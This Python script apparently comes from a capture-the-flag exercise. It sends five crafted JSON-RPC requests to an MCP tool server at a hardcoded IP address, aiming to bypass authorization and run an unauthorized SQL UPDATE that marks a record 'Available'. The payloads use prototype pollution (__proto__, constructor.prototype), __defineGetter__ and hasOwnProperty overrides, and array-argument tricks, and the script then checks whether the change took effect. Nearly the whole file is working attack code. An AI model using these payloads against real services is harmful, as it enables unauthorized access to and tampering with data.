#!/usr/bin/env python3
"""
Test prototype pollution and property manipulation attacks
Based on the "great unwriting" hint - auth check might be bypassed via
prototype pollution or property descriptor manipulation
"""

import requests
import json

MCP_URL = "http://154.57.164.77:30826/mcp"
AUTH_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/event-stream",
    "Authorization": "Bearer 靑"
}

def test_prototype_pollution():
    """Test prototype pollution style bypasses"""

    tests = [
        {
            "name": "Proto pollution with terminating stroke",
            "payload": {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "guardian_query_sql",
                    "arguments": {
                        "query": "UPDATE scrolls SET scroll_availability = 'Available' WHERE id = 7",
                        "__proto__": {"靑": True, "authenticated": True},
                        "constructor": {"prototype": {"靑": True}}
                    }
                },
                "id": 300
            }
        },
        {
            "name": "Property descriptor manipulation",
            "payload": {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "guardian_query_sql",
                    "arguments": {
                        "query": "UPDATE scrolls SET scroll_availability = 'Available' WHERE id = 7",
                        "__defineGetter__": ["靑", "authenticated"],
                        "isAuthenticated": True
                    }
                },
                "id": 301
            }
        },
        {
            "name": "Empty arguments with hasOwnProperty bypass",
            "payload": {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "guardian_query_sql",
                    "arguments": {"hasOwnProperty": "靑"}  # Try to bypass obj.hasOwnProperty('auth') check
                },
                "id": 302
            }
        },
        {
            "name": "What if auth is checked via args.auth === required?",
            "payload": {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "guardian_query_sql",
                    "arguments": {
                        "query": "UPDATE scrolls SET scroll_availability = 'Available' WHERE id = 7",
                        "靑": "valid"
                    }
                },
                "id": 303
            }
        },
        {
            "name": "Array args to bypass check",
            "payload": {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "guardian_query_sql",
                    "arguments": [
                        "UPDATE scrolls SET scroll_availability = 'Available' WHERE id = 7",
                        "靑"
                    ]
                },
                "id": 304
            }
        }
    ]

    print("=== Testing Prototype Pollution & Property Manipulation ===\n")

    for i, test in enumerate(tests, 1):
        print(f"Test {i}: {test['name']}")
        print(f"  Sending request...")

        try:
            response = requests.post(
                MCP_URL,
                headers=AUTH_HEADERS,
                json=test['payload'],
                timeout=10
            )

            # Parse response
            lines = response.text.strip().split('\n')
            for line in lines:
                if line.startswith('data: '):
                    try:
                        data = json.loads(line[6:])  # Skip 'data: '
                        if 'result' in data:
                            content = data['result']['content'][0]['text']
                            print(f"  Response: {content[:100]}")
                        elif 'error' in data:
                            error = data['error']['message']
                            print(f"  Error: {error}")
                    except:
                        pass

        except Exception as e:
            print(f"  Exception: {e}")

        print("---")

    # Check final scroll status
    print("\nFinal scroll 7 status:")
    try:
        resp = requests.get("http://154.57.164.77:30826/api/scrolls")
        scrolls = resp.json()
        for s in scrolls:
            if s['id'] == 7:
                print(f"  Status: {s['scroll_availability']}")
    except:
        print("  Could not check status")

if __name__ == "__main__":
    test_prototype_pollution()
